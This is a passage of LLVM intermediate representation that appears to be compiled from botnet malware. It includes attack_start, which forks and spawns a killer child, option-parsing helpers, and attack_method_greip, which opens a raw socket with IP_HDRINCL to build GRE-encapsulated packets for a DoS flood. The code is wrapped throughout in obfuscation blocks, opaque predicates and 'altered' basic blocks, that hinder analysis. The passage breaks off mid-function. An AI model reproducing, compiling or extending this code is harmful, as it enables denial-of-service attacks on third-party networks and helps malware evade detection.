  %257 = load i32, i32* @y.8
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %255
  %264 = load i32, i32* %13, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %13, align 4
  %266 = load i32, i32* @x.7
  %267 = load i32, i32* @y.8
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %186

; <label>:274:                                    ; preds = %186
  %275 = load i32, i32* @x.7
  %276 = load i32, i32* @y.8
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %274
  %283 = load i32, i32* @x.7
  %284 = load i32, i32* @y.8
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %291

; <label>:291:                                    ; preds = %originalBBpart216, %170
  %292 = call i32* @__errno_location() #7
  store i32 0, i32* %292, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i8, i8* %15, align 1
  %295 = load i8, i8* %16, align 1
  %296 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %297 = load i8, i8* %17, align 1
  %298 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  call void @attack_start(i32 %293, i8 zeroext %294, i8 zeroext %295, %struct.attack_target* %296, i8 zeroext %297, %struct.attack_option* %298)
  br label %299

; <label>:299:                                    ; preds = %291, %225, %212, %195, %169, %originalBBpart24, %69, %57, %46, %32
  %300 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %301 = icmp ne %struct.attack_target* %300, null
  br i1 %301, label %302, label %305

; <label>:302:                                    ; preds = %299
  %303 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %304 = bitcast %struct.attack_target* %303 to i8*
  call void @free(i8* %304) #6
  br label %305

; <label>:305:                                    ; preds = %302, %299
  %306 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %307 = icmp ne %struct.attack_option* %306, null
  br i1 %307, label %308, label %328

; <label>:308:                                    ; preds = %305
  %309 = load i32, i32* @x.7
  %310 = load i32, i32* @y.8
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %308
  %317 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %318 = load i8, i8* %17, align 1
  %319 = zext i8 %318 to i32
  call void @free_opts(%struct.attack_option* %317, i32 %319)
  %320 = load i32, i32* @x.7
  %321 = load i32, i32* @y.8
  %322 = sub i32 %320, 1
  %323 = mul i32 %320, %322
  %324 = urem i32 %323, 2
  %325 = icmp eq i32 %324, 0
  %326 = icmp slt i32 %321, 10
  %327 = or i1 %325, %326
  br i1 %327, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %328

; <label>:328:                                    ; preds = %originalBBpart220, %305
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %329 = alloca i8*, align 8
  %330 = alloca i32, align 4
  %331 = alloca i32, align 4
  %332 = alloca i32, align 4
  %333 = alloca i8, align 1
  %334 = alloca i8, align 1
  %335 = alloca i8, align 1
  %336 = alloca %struct.attack_target*, align 8
  %337 = alloca %struct.attack_option*, align 8
  %338 = alloca i8, align 1
  store i8* %0, i8** %329, align 8
  store i32 %1, i32* %330, align 4
  store %struct.attack_target* null, %struct.attack_target** %336, align 8
  store %struct.attack_option* null, %struct.attack_option** %337, align 8
  %339 = load i32, i32* %330, align 4
  %340 = sext i32 %339 to i64
  %341 = icmp ult i64 %340, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %77
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %342 = load i8, i8* %16, align 1
  %343 = zext i8 %342 to i64
  %344 = call noalias i8* @calloc(i64 %343, i64 24) #6
  %345 = bitcast i8* %344 to %struct.attack_target*
  store %struct.attack_target* %345, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %255
  %346 = load i32, i32* %13, align 4
  %_ = sub i32 0, %346
  %gen = add i32 %_, 1
  %347 = add nsw i32 %346, 1
  store i32 %347, i32* %13, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %274
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %308
  %348 = load %struct.attack_option*, %struct.attack_option** %19, align 8
  %349 = load i8, i8* %17, align 1
  %350 = zext i8 %349 to i32
  call void @free_opts(%struct.attack_option* %348, i32 %350)
  br label %originalBB18
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %44

; <label>:27:                                     ; preds = %23
  %28 = load i32, i32* @x.9
  %29 = load i32, i32* @y.10
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  call void @exit(i32 0) #8
  %36 = load i32, i32* @x.9
  %37 = load i32, i32* @y.10
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:44:                                     ; preds = %23
  %45 = load i32, i32* %14, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %52

; <label>:47:                                     ; preds = %44
  %48 = load i32, i32* %7, align 4
  %49 = call i32 @sleep(i32 %48)
  %50 = call i32 @getppid() #6
  %51 = call i32 @kill(i32 %50, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:52:                                     ; preds = %44
  store i32 0, i32* %15, align 4
  br label %53

; <label>:53:                                     ; preds = %83, %52
  %54 = load i32, i32* %15, align 4
  %55 = load i8, i8* @methods_len, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp slt i32 %54, %56
  br i1 %57, label %58, label %86

; <label>:58:                                     ; preds = %53
  %59 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %60 = load i32, i32* %15, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %59, i64 %61
  %63 = load %struct.attack_method*, %struct.attack_method** %62, align 8
  %64 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 8
  %66 = zext i8 %65 to i32
  %67 = load i8, i8* %8, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %66, %68
  br i1 %69, label %70, label %82

; <label>:70:                                     ; preds = %58
  %71 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %72 = load i32, i32* %15, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %71, i64 %73
  %75 = load %struct.attack_method*, %struct.attack_method** %74, align 8
  %76 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %75, i32 0, i32 0
  %77 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %76, align 8
  %78 = load i8, i8* %9, align 1
  %79 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %80 = load i8, i8* %11, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %77(i8 zeroext %78, %struct.attack_target* %79, i8 zeroext %80, %struct.attack_option* %81)
  br label %86

; <label>:82:                                     ; preds = %58
  br label %83

; <label>:83:                                     ; preds = %82
  %84 = load i32, i32* %15, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %15, align 4
  br label %53

; <label>:86:                                     ; preds = %70, %53
  %87 = load i32, i32* @x.9
  %88 = load i32, i32* @y.10
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %86
  call void @exit(i32 0) #8
  %95 = load i32, i32* @x.9
  %96 = load i32, i32* @y.10
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %27
  call void @exit(i32 0) #8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %86
  call void @exit(i32 0) #8
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %25

; <label>:8:                                      ; preds = %2
  %9 = load i32, i32* @x.11
  %10 = load i32, i32* @y.12
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* @x.11
  %18 = load i32, i32* @y.12
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %84

; <label>:25:                                     ; preds = %2
  store i32 0, i32* %5, align 4
  br label %26

; <label>:26:                                     ; preds = %78, %25
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %81

; <label>:30:                                     ; preds = %26
  %31 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i64 %33
  %35 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %34, i32 0, i32 0
  %36 = load i8*, i8** %35, align 8
  %37 = icmp ne i8* %36, null
  br i1 %37, label %38, label %61

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @x.11
  %40 = load i32, i32* @y.12
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %47, i64 %49
  %51 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %50, i32 0, i32 0
  %52 = load i8*, i8** %51, align 8
  call void @free(i8* %52) #6
  %53 = load i32, i32* @x.11
  %54 = load i32, i32* @y.12
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %61

; <label>:61:                                     ; preds = %originalBBpart24, %30
  %62 = load i32, i32* @x.11
  %63 = load i32, i32* @y.12
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %61
  %70 = load i32, i32* @x.11
  %71 = load i32, i32* @y.12
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %78

; <label>:78:                                     ; preds = %originalBBpart28
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %5, align 4
  br label %26

; <label>:81:                                     ; preds = %26
  %82 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %83 = bitcast %struct.attack_option* %82 to i8*
  call void @free(i8* %83) #6
  br label %84

; <label>:84:                                     ; preds = %81, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %85 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %88, i32 0, i32 0
  %90 = load i8*, i8** %89, align 8
  call void @free(i8* %90) #6
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

; <label>:27:                                     ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

; <label>:34:                                     ; preds = %16
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11

; <label>:38:                                     ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

; <label>:40:                                     ; preds = %38, %27
  %41 = load i32, i32* @x.13
  %42 = load i32, i32* @y.14
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %40
  %49 = load i8*, i8** %5, align 8
  %50 = load i32, i32* @x.13
  %51 = load i32, i32* @y.14
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %49

originalBBalteredBB:                              ; preds = %originalBB, %40
  %58 = load i8*, i8** %5, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %38

; <label>:19:                                     ; preds = %4
  %20 = load i32, i32* @x.15
  %21 = load i32, i32* @y.16
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @util_atoi(i8* %28, i32 10)
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.15
  %31 = load i32, i32* @y.16
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %17
  %39 = load i32, i32* @x.15
  %40 = load i32, i32* @y.16
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* @x.15
  %49 = load i32, i32* @y.16
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %19
  %56 = load i8*, i8** %10, align 8
  %57 = call i32 @util_atoi(i8* %56, i32 10)
  store i32 %57, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %58 = load i32, i32* %5, align 4
  br label %originalBB1
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %4
  br label %609

; <label>:79:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %80 = load i32, i32* %10, align 4
  %81 = bitcast i32* %9 to i8*
  %82 = call i32 @setsockopt(i32 %80, i32 0, i32 3, i8* %81, i32 4) #6
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %103

; <label>:84:                                     ; preds = %79
  %85 = load i32, i32* @x.19
  %86 = load i32, i32* @y.20
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %84
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  %95 = load i32, i32* @x.19
  %96 = load i32, i32* @y.20
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
